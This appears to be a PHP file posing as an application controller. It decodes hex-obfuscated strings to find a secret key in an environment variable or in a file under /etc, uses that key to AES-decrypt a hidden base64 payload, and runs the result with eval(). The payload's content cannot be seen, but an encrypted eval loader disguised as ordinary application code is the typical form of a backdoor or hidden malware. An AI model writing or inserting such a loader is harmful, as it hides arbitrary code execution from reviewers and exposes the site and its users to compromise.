<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('CETObw0OaeXqXiBJwbBmTw==');

$c=base64_decode(

'Q08KJ/XPifPDPvStbfxOvMwsYOaduj2M/pZ3yRxzjmHtReEM+StbjAqpdRNpn9FBmkmlvZMbpD+Z' .
'wPhXUO45RaIFGSlUKRCOAESJXiQeN+jFSQCZq5rm+Bq5t7R1sowUgOpFp7wWxf3RVGyXfgvYnCwM' .
'WLBZByk26nbbmBAKfXnM6NKnRiksIVXKET4w3a66zobLSuQIKSkLPrIH0RrZah13FeYW8s4p6kTv' .
'SetpMVQJJlRnm0BqlcvHKxPIuM4o'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

